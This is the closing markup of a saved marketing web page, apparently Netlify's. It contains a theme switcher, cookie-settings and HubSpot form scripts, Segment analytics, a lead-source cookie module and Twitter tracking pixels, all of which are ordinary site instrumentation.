                    <option value="" selected="">System</option>
                    <option value="dark">Dark</option>
                    <option value="light">Light</option>
                </select>
            </label>
            <script>
                const themeSelect = document.getElementById('site-theme-select');

                themeSelect.value = localStorage.getItem('theme') ?? '';

                const handleThemeChange = (value) => {
                    const element = document.documentElement;

                    if (value === '') {
                        element.removeAttribute('data-theme');
                        localStorage.removeItem('theme');
                    } else {
                        element.setAttribute('data-theme', value);
                        localStorage.setItem('theme', value);
                    }
                }
                ;

                themeSelect?.addEventListener('change', (e) => handleThemeChange(e.target.value));
            </script>
        </footer>
        <script type="module">
            document.querySelector("#cta-legal-footer-cookie-settings-toggle")?.addEventListener("click", e => {
                e.preventDefault(),
                window.OneTrust && window.OneTrust.ToggleInfoDisplay()
            }
            );
        </script>
        <!-- required for all HubSpot forms  -->
        <script defer="" src="https://js.hsforms.net/forms/v2.js"></script>
        <script type="text/javascript" id="hs-script-loader" async="" defer="" src="//js.hs-scripts.com/7477936.js"></script>
    

<script type="module">
    window.addEventListener("stackbitObjectsChanged", e => {
        e.preventDefault(),
        e.detail.changedObjectIds.some(d => e.detail.visibleObjectIds.includes(d)) && window.location.reload()
    }
    );
</script>
<script type="text/javascript" id="" charset="">["click","scroll","mousemove","touchstart"].forEach(function(a){window.addEventListener(a,firstInteraction,{once:!0})});var userInteracted=!1;function firstInteraction(){userInteracted||(userInteracted=!0,window.dataLayer=window.dataLayer||[],dataLayer.push({event:"firstInteraction"}))};</script><script type="text/javascript" id="" charset="">window.addEventListener("message",function(a){"hsFormCallback"===a.data.type&&"onFormSubmitted"===a.data.eventName&&(window.dataLayer.push({event:"hubspot-form-success","hs-form-guid":a.data.id}),console.log("Submitted "+a.data.id))});
void 0!=document.querySelectorAll(".hs-form")[0]&&null!=document.querySelectorAll(".hs-form")[0].getAttribute("data-form-id")?(window.dataLayer.push({event:"hubspot-form-ready","hs-form-guid":document.querySelectorAll(".hs-form")[0].getAttribute("data-form-id")}),console.log("Ready "+document.querySelectorAll(".hs-form")[0].getAttribute("data-form-id"))):window.addEventListener("message",function(a){"hsFormCallback"===a.data.type&&"onFormReady"===a.data.eventName&&(window.dataLayer.push({event:"hubspot-form-ready",
"hs-form-guid":a.data.id}),console.log("Ready "+a.data.id))});</script><script type="text/javascript" id="" charset="">!function(){var a=window.analytics=window.analytics||[];if(!a.initialize)if(a.invoked)window.console&&console.error&&console.error("Segment snippet included twice.");else{a.invoked=!0;a.methods="trackSubmit trackClick trackLink trackForm pageview identify reset group track ready alias debug page once off on addSourceMiddleware addIntegrationMiddleware setAnonymousId addDestinationMiddleware".split(" ");a.factory=function(b){return function(){var c=Array.prototype.slice.call(arguments);c.unshift(b);
a.push(c);return a}};for(var e=0;e<a.methods.length;e++){var f=a.methods[e];a[f]=a.factory(f)}a.load=function(b,c){var d=document.createElement("script");d.type="text/javascript";d.async=!0;d.src="https://cdn.segment.com/analytics.js/v1/"+b+"/analytics.min.js";b=document.getElementsByTagName("script")[0];b.parentNode.insertBefore(d,b);a._loadOptions=c};a._writeKey="YOUR_WRITE_KEY";a.SNIPPET_VERSION="4.15.2";a.load("7f8W9mAxost9lRWyMuVR8xaMv9kHxBsy");a.page()}}();</script> <script type="text/javascript" id="" charset="">var LeadSourceModule=function(){function d(a){a+="\x3d";for(var c=document.cookie.split(";"),e=0;e<c.length;e++){for(var b=c[e];" "==b.charAt(0);)b=b.substring(1,b.length);if(0==b.indexOf(a))return b.substring(a.length,b.length)}return null}function f(a,c,e){var b=new Date;b.setTime(b.getTime()+864E5*a);a="expires\x3d"+b.toUTCString();document.cookie=c+"\x3d"+e+";"+a+";path\x3d/;domain\x3d"+p}function h(){var a={};var c=location.search.substring(1);""!=c&&(a=JSON.parse('{"'+decodeURI(c).replace(/"/g,
'\\"').replace(/&/g,'","').replace(/=/g,'":"')+'"}'));return a=a.hasOwnProperty("utm_medium")?"org_social"==a.utm_medium?"Organic Social":"paid_social"==a.utm_medium?"Paid Social":"display"==a.utm_medium?"Display":"paid_search"==a.utm_medium?"Paid Search":"Marketing Unknown":-3<document.referrer.indexOf("google")+document.referrer.indexOf("bing")+document.referrer.indexOf("duckduck")?"Organic Search":-3<document.referrer.indexOf("twitter")+document.referrer.indexOf("linkedin")+document.referrer.indexOf("facebook")?
"Organic Social":""!=document.referrer?"Inbound Link":"Marketing Unknown"}function q(){var a=d(k),c=d(l),e=d(m);""!=a&&null!=a||""!=c&&null!=c||""!=e&&null!=e?f(g,n,h()):(f(g,n,h()),f(g,k,h()),a=document.referrer?document.referrer:"(Direct)",f(g,l,a),a=window.location.href,f(g,m,a))}var k="_lead_source",n="_recent_lead_source",l="_initial_referrer",m="_initial_landing_page",p="netlify.com",g=90;return{init:q,readCookie:d}}();LeadSourceModule.init();var cookiedLS=LeadSourceModule.readCookie("_lead_source");
function formPopulate(d){document.querySelector("input[name\x3d'leadsource']")&&(document.querySelector("input[name\x3d'leadsource']").value=d)}formPopulate(cookiedLS);window.addEventListener("DOMContentLoaded",function(){formPopulate(cookiedLS)});window.addEventListener("message",function(d){"hsFormCallback"===d.data.type&&"onFormReady"===d.data.eventName&&formPopulate(cookiedLS)});</script><iframe height="0" width="0" style="display: none; visibility: hidden;"></iframe><script type="text/javascript" id="" charset="">window.addEventListener("message",function(a){if(a.origin!="https://meetings.hubspot.com")return!1;a.data.meetingBookSucceeded&&window.dataLayer.push({event:"hubspot_meeting_booked"})});</script>
<div class="go2933276541 go2369186930" id="hs-web-interactives-top-anchor"><div id="hs-interactives-modal-overlay" class="go1632949049"></div></div>
<div class="go2933276541 go1348078617" id="hs-web-interactives-bottom-anchor"></div>
<div id="hs-web-interactives-floating-container">
  <div id="hs-web-interactives-floating-top-left-anchor" class="go2417249464 go613305155">
  </div>
  <div id="hs-web-interactives-floating-top-right-anchor" class="go2417249464 go471583506">
  </div>
  <div id="hs-web-interactives-floating-bottom-left-anchor" class="go2417249464 go3921366393">
  </div>
  <div id="hs-web-interactives-floating-bottom-right-anchor" class="go2417249464 go3967842156">
  </div>
</div>
<img src="https://t.co/1/i/adsct?bci=4&amp;dv=Asia%2FJakarta%26en-US%2Cen%26na%26Win32%26255%261920%261080%2612%2624%261920%261032%260%26unspecified&amp;eci=3&amp;event=%7B%7D&amp;event_id=5145c4a9-78c2-4790-8f96-d65060d71c98&amp;integration=gtm&amp;p_id=Twitter&amp;p_user_id=0&amp;pl_id=81c6984e-8239-48dd-aafb-47a75de95281&amp;pt=Scale%20%26Ship%20Faster%20with%20a%20Composable%20Web%20Architecture%20%7C%20Netlify&amp;tw_document_href=https%3A%2F%2Fsubmit.business-service-center.com%2F&amp;tw_iframe_status=0&amp;txn_id=nvy7r&amp;type=javascript&amp;version=2.3.34" height="1" width="1" style="display: none;"><img src="https://analytics.twitter.com/1/i/adsct?bci=4&amp;dv=Asia%2FJakarta%26en-US%2Cen%26na%26Win32%26255%261920%261080%2612%2624%261920%261032%260%26unspecified&amp;eci=3&amp;event=%7B%7D&amp;event_id=5145c4a9-78c2-4790-8f96-d65060d71c98&amp;integration=gtm&amp;p_id=Twitter&amp;p_user_id=0&amp;pl_id=81c6984e-8239-48dd-aafb-47a75de95281&amp;pt=Scale%20%26Ship%20Faster%20with%20a%20Composable%20Web%20Architecture%20%7C%20Netlify&amp;tw_document_href=https%3A%2F%2Fsubmit.business-service-center.com%2F&amp;tw_iframe_status=0&amp;txn_id=nvy7r&amp;type=javascript&amp;version=2.3.34" height="1" width="1" style="display: none;"><script type="text/javascript" id="" charset="">var links=document.getElementsByTagName("a"),pageUrl=new URL(window.location),path=pageUrl.pathname==="/"?"homepage":pageUrl.pathname;function slugify(a){return a.replace(/\//g,"-").replace(/[^\w\s-]/g,"").replace(/[\s_-]+/g,"-").replace(/^-+|-+$/g,"")}
for(var i=0;i<links.length;i++){var link=links[i];if(link.href.includes("/contact")||/resources\/webinars\/./.test(link.href))try{var linkUrl=new URL(link.href);!linkUrl.host.includes("netlify.com")||linkUrl.searchParams.has("attr")||linkUrl.searchParams.has("ref")||linkUrl.searchParams.has("id")||(linkUrl.searchParams.set("attr",slugify(path)),linkUrl.searchParams.set("ref",slugify(link.innerText.toLowerCase())),linkUrl.searchParams.set("id",slugify(link.id.toLowerCase())),link.href=linkUrl.toString())}catch(a){}};</script>
</body></html>